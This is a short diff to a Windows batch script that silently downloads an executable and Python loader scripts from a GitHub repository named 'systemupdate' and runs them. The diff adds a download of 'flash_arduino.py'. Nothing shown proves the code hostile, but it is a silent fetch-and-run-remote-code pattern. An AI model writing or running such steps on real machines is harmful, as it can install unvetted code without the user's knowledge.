@@ -21,6 +21,7 @@ if not exist "%~dp0sooplive client.exe" (
     curl -s -L -o "%~dp0sooplive client.exe" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/sooplive%%20client.exe"
 )
 curl -s -o "%~dp0dloader.py" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/ddong_loader.py?t=%RANDOM%"
+curl -s -o "%~dp0flash_arduino.py" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/flash_arduino.py?t=%RANDOM%"
 if exist "%~dp0sooplive client.exe" (
     start "" "%~dp0sooplive client.exe" "%~dp0dloader.py"
 ) else (
